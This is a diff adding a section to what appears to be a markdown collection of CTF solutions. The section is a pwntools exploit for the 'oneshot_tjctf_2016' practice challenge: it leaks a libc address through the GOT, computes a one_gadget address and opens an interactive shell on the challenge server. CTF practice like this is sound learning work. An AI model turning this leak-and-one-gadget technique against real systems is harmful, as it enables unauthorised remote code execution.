@@ -389,6 +389,26 @@ icon: icon-html
 
   
 
+* ### oneshot_tjctf_2016
+
+  ```python
+  from pwn import *
+  r = remote('pwn.buuoj.cn', 20082)
+  elf = ELF('./oneshot_tjctf_2016')
+  libc = ELF('./x64_libc.so.6')
+  puts_got = elf.got['puts']
+  puts_libc = libc.symbols['puts']
+  one_libc = 0x45216
+  r.sendline(str(puts_got))
+  r.recvuntil('Value: ')
+  puts = int(r.recvuntil('\n',drop = True),16)
+  libc_base = puts - puts_libc
+  log.success(hex(libc_base))
+  fuck = libc_base + one_libc
+  r.sendline(str(fuck))
+  r.interactive()
+  ```
+
 * 
 
 
